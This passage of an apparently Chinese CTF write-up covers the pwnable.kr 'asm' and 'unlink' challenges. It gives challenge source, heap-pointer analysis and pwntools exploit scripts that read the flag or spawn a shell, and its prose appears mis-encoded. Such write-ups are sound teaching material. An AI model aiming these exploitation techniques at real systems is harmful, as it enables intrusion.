number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-17"><a href="#ÂàÜÊûê-17" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøôÈÅìÈ¢ò‰∏ªË¶ÅÊ∂âÂèä<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a></p><blockquote><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a ‚Äúsecure‚Äù state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system‚Äôs resources but isolates the process from them entirely.</p></blockquote><p>ÈÄöËøáÊ≠§ÁâπÊÄßÂàùÂßãÂåñSCMP_ACT_KILLÈôêÂà∂‰∫ÜÊâÄÊúâ syscallÔºåÂêéÊ∑ªÂä†ËßÑÂàôÂÖÅËÆ∏‰ΩøÁî®ÁöÑ‰ªÖ‰∏∫ open read write exit exit_group</p><p>Êàë‰ª¨ÈúÄË¶ÅÂÅöÁöÑ‰æøÊòØÔºö</p><ol><li>ÊâìÂºÄ(open) flag Êñá‰ª∂</li><li>ËØªÂèñ(read) flag Êñá‰ª∂</li><li>ÂÜô(write) Êñá‰ª∂ÂÜÖÂÆπÂÜôÂà∞Ê†áÂáÜËæìÂá∫(stdout)</li></ol><p>ÂØπÂÖ•Èó®‰∏ç‰ºöÁîüÊàê shellcode ÁöÑÊàëÔºåpwnlib Êèê‰æõ‰∫Ü shellcraftÔºå<strong>Ê≥®ÊÑèÂèëÈÄÅÊó∂ÈúÄË¶ÅË∞ÉÁî® asm ÊñπÊ≥ïÁºñËØëÊ±áÁºñÁ†Å</strong></p><hr><ul><li><a href="https://www.man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener">Linux Programmer‚Äôs Manual </a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux" target="_blank" rel="noopener">X86 Assembly/Interfacing with Linux</a></li></ul><p>‰ªé‰∏äÈù¢ÁöÑËµÑÊñôÂèØÁü•Êñá‰ª∂Âè•ÊüÑÊòØÈÄöËøá rax ËøîÂõûÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•‰ªé rax ËØªÂèñÊñá‰ª∂Âç≥ÂèØÔºå‰ΩÜÂÆûÈôÖ‰∏älinuxÊñá‰ª∂Âè•ÊüÑ(fd)ÊòØ‰ªé 3 ÂºÄÂßãÂ¢ûÈïøÁöÑÔºåÂõ†‰∏∫Êàë‰ª¨Á¨¨‰∏Ä‰∏™‰πüÂè™ÊâìÂºÄ‰∏Ä‰∏™ÔºåÊâÄ‰ª•ÂøÖÂÆöÊòØ 3</p><h3 id="Ëß£È¢ò-17"><a href="#Ëß£È¢ò-17" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sc += shellcraft.read("rax", "rsp", 100)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="19-unlink"><a href="#19-unlink" class="headerlink" title="19. unlink"></a>19. unlink</h2><h3 id="È¢òÁõÆ-18"><a href="#È¢òÁõÆ-18" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token punctuation">{</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>OBJ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token punctuation">{</span>    OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>    BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>    FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>    FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>    BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>    A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>    B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>    B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>    C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// heap overflow!</span>    <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// exploit this unlink!</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-18"><a href="#ÂàÜÊûê-18" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¶ñÂÖàÂÖàÁúã‰∫Ü double-free ÁöÑÂà©Áî®ÔºåÂç≥ unlink ÁöÑ‰∏ÄÁßçÂà©Áî®ÊòØÈÄöËøáÂä´ÊåÅGOTË°®ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØÈ¢òÁõÆ‰∏≠ Unlink ÂêéÊ≤°ÊúâË∑üÂÖ∂‰ªñÂáΩÊï∞ÁöÑÔºåÊâÄ‰ª•Êó†Ê≥ïÂà©Áî®</p><p>ÈÇ£‰πàËÉΩÂê¶Áõ¥Êé•ÊìçÊéß main ËøîÂõûÂú∞ÂùÄÊù•ÂÆûÁé∞Ë∑≥ËΩ¨Âà∞ shellcode ÊâßË°åÂë¢ÔºüÁúã‰∏ã main ÊúÄÂêéÁöÑÊ±áÁºñÊòØÊÄé‰πàÂÜôÁöÑ</p><pre class=" language-armasm"><code class="language-armasm">0x080485ff <+208>:    mov    ecx,DWORD PTR [ebp-0x4]0x08048602 <+211>:    leave  0x08048603 <+212>:    lea    esp,[ecx-0x4]0x08048606 <+215>:    ret </code></pre><p>ÁøªËØëËøáÊù•</p><pre class=" language-armsam"><code class="language-armsam">mov    ecx,[ebp-0x4]mov    esp,ebppop    ebplea    esp,[ecx-0x4]ret</code></pre><p>Ê≠§Êó∂Ê†àÂÜÖÂàÜÂ∏É</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15918589934469.jpg" alt="-w790"></p><p>Êàë‰ª¨Êó†Ê≥ïÁõ¥Êé•ÊéßÂà∂ eipÔºåÈÇ£‰πàËÉΩÂê¶ÈÄöËøáÊéßÂà∂ ebp -&gt; ecx -&gt; esp -&gt; eip ÂÆûÁé∞Âë¢</p><p>Êàë‰ª¨È¶ñÂÖàÂÖ≥Ê≥®Âà∞ unlink</p><pre class=" language-c"><code class="language-c">BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span></code></pre><p>Â¶Ç‰∏ãÔºö</p><pre class=" language-plain"><code class="language-plain">BK = *(P + 4)FD = *(P)FD -> bk = BK -> *(*(P)+4) = *(P + 4)BK -> fd = FD -> *(*(P+4)) = *(P)</code></pre><p>Êõ¥Áõ¥ÁôΩÁöÑËØ¥</p><pre class=" language-plain"><code class="language-plain">*(*(P->fd) + 4) = *(P->bk) Â∞Ü fd ÁöÑÂÄº +4 ‰Ωú‰∏∫Âú∞ÂùÄÔºåÂÖ∂ÂÄº‰∏∫ bk ÁöÑÂÄº*(*(P->bk)) = *(P->fd) Â∞Ü bk ÁöÑÂÄº‰Ωú‰∏∫Âú∞ÂùÄÔºåÂÖ∂ÂÄº‰∏∫ fd ÁöÑÂÄº</code></pre><p>Âç≥Êàë‰ª¨ÈÄöËøáÊéßÂà∂ fd bk ÂèØ‰ª•Ëé∑ÂèñÂà∞‰∏§Ê¨°ÂÜôÂÜÖÂ≠òÁöÑÊú∫‰ºö</p><ol><li>Âà©Áî® BK -&gt; fd = FDÔºåbk ÊéßÂà∂Âú∞ÂùÄÔºåfd ÊéßÂà∂ÂÄº</li><li>Âà©Áî® FD -&gt; bk = BKÔºåfd ÊéßÂà∂Âú∞ÂùÄÔºåbk ÊéßÂà∂ÂÄº</li></ol><p>ÂÖ∂Ê¨°ÊääÂ∑≤Áü•Êù°‰ª∂ÂàóÂá∫Êù•</p><ul><li>eip = [esp]</li><li>esp = ecx - 0x4</li><li>ecx = [ebp - 0x4]</li></ul><p>ÂÜçÊ†πÊçÆÊ†à‰∏≠ÂÜÖÂÆπÔºåÂèØÂæó</p><ul><li>stack_A + 0x10 = ebp - 0x4</li></ul><p>Áî±‰∫éÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá A-&gt;buf ËøõË°å overflowÔºåÂÅáËÆæÊàë‰ª¨Â∞Üfunc_shellÊîæÂú®bufÂâç4‰∏™Â≠óËäÇÔºåÂêåÊó∂Êàë‰ª¨ÊääbufÂú∞ÂùÄÊ†áËÆ∞‰∏∫ shellcodeÔºåÈÇ£‰πàÂ∞±Êúâ</p><ul><li>[heap_A + 0x8] = [shellcode] = func_shell = eip</li><li>shellcode = esp = ecx - 0x4 =&gt; heap_A + 0x8 = ecx - 0x4</li></ul><p>Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØÈÄöËøáÊéßÂà∂ fd bk ËøõËÄåÊéßÂà∂Ê†àÂÜÖÂ≠òÂÇ®ÁöÑ ecxÔºåËøõËÄåÊéßÂà∂ esp eipÔºåÊàë‰ª¨ÂÖàÈÄâÂèñ<code>bk Âú∞ÂùÄ fd ÂÄº</code>ÁöÑÂà©Áî®ÊñπÂºèÂç≥<code>BK-&gt;fd=FD</code>ÔºåÊúâ</p><ul><li>[bk] = &amp;ecx</li><li>[fd] = ecx</li></ul><p>ÁªìÂêà‰∏äÈù¢ÁöÑÊù°‰ª∂ÔºåÊé®Âæó</p><ul><li>[bk] = ebp - 0x4 = stack_A + 0x10</li><li>[fd] = heap_A + 0xc</li></ul><p>‰ª•Ê≠§ËÆæÁΩÆÂ∏ÉÂ±ÄÂ¶Ç‰∏ãÔºö</p><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|   heap_A + 0xc  |  stack_A + 0x10 |+-----------------+-----------------+ </code></pre><hr><p>ÂÅáÂ¶ÇÊàë‰ª¨ÈÄâÊã©<code>fd Âú∞ÂùÄ bk ÂÄº</code>ÁöÑÊñπÂºè<code>FD-&gt;bk=BK</code>ÔºåÊúâ</p><ul><li>[bk] = ecx</li><li>[fd] + 0x4 = &amp;ecx</li></ul><p>Êé®Âæó</p><ul><li>[bk] = heap_A + 0xc</li><li>[fd] = ebp - 0x4 - 0x4 = stack_A + 0x10 - 0x4 = stack_A + 0xc</li></ul><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|  stack_A + 0xc  |   heap_A + 0xc  |+-----------------+-----------------+ </code></pre><h3 id="Ëß£È¢ò-18"><a href="#Ëß£È¢ò-18" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ÂÅöÂÆåÈ¢òÂêéÂÜçÊÉ≥‰∫ÜÂá†ÈÅçÊûÑÈÄ†ÂéüÁêÜÔºåÊÑüËßâÈÄöÈÄè‰∫Ü‰∏çÂ∞ë</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>is_remote <span class="token operator">=</span> <span class="token boolean">True</span>method <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 1 or 2</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/unlink/unlink"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/unlink"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is stack address leak: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is heap address leak: "</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"get shell!\n"</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x080484eb</span><span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">else</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"."</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="20-blukat"><a href="#20-blukat" class="headerlink" title="20. blukat"></a>20. blukat</h2><h3 id="È¢òÁõÆ-19"><a href="#È¢òÁõÆ-19" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token 